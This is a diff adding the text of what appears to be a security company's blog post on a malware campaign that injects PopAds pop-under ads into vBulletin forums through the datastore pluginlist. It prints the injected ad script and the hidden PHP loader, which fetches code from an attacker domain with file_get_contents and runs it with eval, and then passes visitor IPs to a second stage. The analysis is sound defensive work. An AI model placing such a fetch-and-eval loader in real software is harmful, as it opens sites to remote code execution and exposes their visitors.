@@ -1,0 +1,56 @@
+vBulletin Used to Show Malicious Advertisements
+
+In the past, we have seen a massive amount of vBulletin websites compromised through the VBSeo Vulnerability. Attackers have been infecting vBulletin websites since 2012 with this malware, and more recently with a new variation of the same infection. Ever since this new development, the table datastore in vBulletin has been a prime candidate for attackers to store malicious code where malware can be easily loaded on every visit.
+Recently, we came across a malware campaign of vBulletin websites showing malicious ads from popads[.]net for no apparent reason. The webmasters had no idea where they were coming from.
+Pop-up Ads on vBulletin Forums
+This ad network is well known for nasty pop-ups and malware-spreading advertisements as the core part of its network, which makes this a troublesome situation.
+Here’s an example of the code being injected into the vBulletin sites:
+<!-- PopAds.net Popunder Code for www.YourSite.com -->
+<script type="text/javascript" data-cfasync="false">
+var _pop = _pop || [];
+_pop.push(['siteId', 1514372]);
+_pop.push(['minBid', 0]);
+_pop.push(['popundersPerIP', 0]);
+_pop.push(['delayBetween', 0]);
+_pop.push(['default', false]);
+_pop.push(['defaultPerDay', 0]);
+_pop.push(['topmostLayer', false]);
+(function() {
+var pa = document.createElement('script'); pa.type = 'text/javascript'; pa.async = true;
+var s = document.getElementsByTagName('script')[0];
+pa.src = '//c1.popads.net/pop.js';
+pa.onerror = function() {
+var sa = document.createElement('script'); sa.type = 'text/javascript'; sa.async = true;
+sa.src = '//c2.popads.net/pop.js';
+s.parentNode.insertBefore(sa, s);
+};
+s.parentNode.insertBefore(pa, s);
+})();
+</script>
+<!-- PopAds.net Popunder Code End -->
+The code is quite easy to spot because it’s placed after the closing </html> tags. Most website security scanners would flag it as suspicious, and strangely enough, it’s only being displayed once per IP. This means a repeat visitor wouldn’t see the ads on subsequent visits.
+External PHP File Loading in Pluginlist
+Knowing how vBulletin infections tend to store themselves inside the datastore table, we went on to take a look at that table, more specifically in the pluginlist row.
+We found something that shouldn’t be there in the middle of the Tapatalk code:
+$output = preg_replace('@<link href="([^">]+)android-app:\/\/com.quoord\.tapatalkpro\.activity\/tapatalk@',
+'<link href="android-app://com.quoord.tapatalkpro.activity/tapatalk', $output);
+$output = preg_replace('@<link href="([^">]+)ios-app:\/\/307880732\/tapatalk@',
+'<link href="ios-app://307880732/tapatalk', $output);
+$config_data = file_get_contents('http://geekube(.)com/wp-content/uploads/2013/xml.php?a=inner&host=' . $_SERVER['SERVER_NAME']);
+if(strlen($config_data) > 0){ eval($config_data); }
+";s:14:"page_templates";s:106:"global $vbulletin;
+Loading PHP files from external sources through the pluginlist is never a good thing – so it deserves further investigation. We took steps to simply mimic the requests in question.
+On the first level of the request, the geekube(.)com domain returns us with the following PHP file hosted on a malicious WordPress site:
+$output .= file_get_contents('http://geekube.com/wp-content/uploads/2013/uploads/sites/16b54149eeb067699ab60ce79aa44b9e/js.php?remote=' . $_SERVER['REMOTE_ADDR']);
+We can see that the external script receives the visitor’s IP address, which allows the malware to perform its conditional IP controls and make detection harder. It also means we can easily spoof the requests with a new IP to get to the next step.
+By turning $_SERVER[‘REMOTE_ADDR’] into a server IP – for example, 192.192.192.192 – the next script immediately returns the entire block of code for the popads advertisement code we saw initially.
+The first part of the request chain makes use of $_SERVER[‘SERVER_NAME’] and now we can see why; the script customizes the code to make it look as legitimate as possible by modifying the initial comment line:
+<!-- PopAds.net Popunder Code for www.YourSite.com -->
+The script will display the victim’s website domain in the comment line instead of www.YourSite.com in an attempt to fool webmasters into mistaking it for legitimate code.
+New Domains Being Used
+
+A new domain involved in this campaign has been using the exact same mechanisms and requests – images(.)imagenetcom(.)com
+We suspect there will be other sites that also leverage this tactic against vBulletin sites.
+It’s always important to keep an eye on the plugins you have on your website. This is important in vBulletin due to the ease with which the attackers can add custom code or calls to external scripts in already existing plugins. This alone makes it difficult for a webmaster to locate the malicious injection, unless constant reviews of the plugins in use are done.
+Integrity monitoring services will also help you stay aware of any unauthorized modifications to plugins and files on your site.
+If you suspect your website has been infected, we are always ready to assist you.
